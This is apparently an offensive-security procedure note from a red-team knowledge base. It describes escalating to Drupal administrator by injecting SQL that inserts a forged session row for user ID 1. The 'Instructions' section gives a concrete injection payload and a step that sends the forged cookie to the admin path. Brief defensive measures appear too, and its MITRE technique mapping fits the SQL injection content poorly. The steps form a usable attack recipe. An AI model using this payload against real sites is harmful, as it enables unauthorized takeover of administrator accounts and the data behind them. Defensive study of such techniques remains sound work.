---
tags:
  - session-hijacking
  - sqli
  - drupal
type: procedure
tactics:
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
  - Database
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:31:30.666Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[T1133.001]]'
id: ce070d88-c7bc-46d9-961a-37b53f162a0c
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[External Remote Services]]'
---
# Manipulate Sessions via SQL Injection

## Summary

This procedure uses SQL injection to insert or modify session records in Drupal's sessions table, creating an admin-privileged session (User ID 1) for privilege escalation.

## Description

Drupal stores sessions in a database table with fields like sid, uid, and session data. By injecting an INSERT statement, attackers can forge a session cookie, bypassing authentication to gain admin access.

## Requirements

1. SQL injection access from previous exploitation
2. Understanding of Drupal session schema
3. Ability to set cookies in HTTP requests

## Defense

Defensive measures and detection strategies:

- Validate session data integrity with HMAC
- Monitor for anomalous session creations
- Enforce session IP/user-agent binding

## Objectives

1. Create fake admin session record
2. Impersonate User ID 1
3. Gain privileged access to Drupal backend

## Instructions

### Step 1: Inject Session Insert

**Context**: Craft SQL to add a new session row.

Payload: array(':id' => array('1); INSERT INTO sessions (sid, ssid, uid, hostname, timestamp, session) VALUES (\'fakesid\', \'\', 1, \'attacker.ip\', UNIX_TIMESTAMP(), \'s:32:\"admin_data\";\'); -- ' => 'dummy'));

> Expected: New row inserted; query succeeds without error.

### Step 2: Use Forged Session

**Context**: Set cookie and access admin areas.

Send request with Cookie: SESSfakesid=1; to http://target/admin. Verify access.

> Expected: Admin dashboard loaded without login prompt.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[External Remote Services]]

### Sub-Techniques

- [[T1133.001]]

## Commands Used


## Tools Used


## Tags

- [[session-manipulation]]
- [[sqli]]
- [[drupal]]
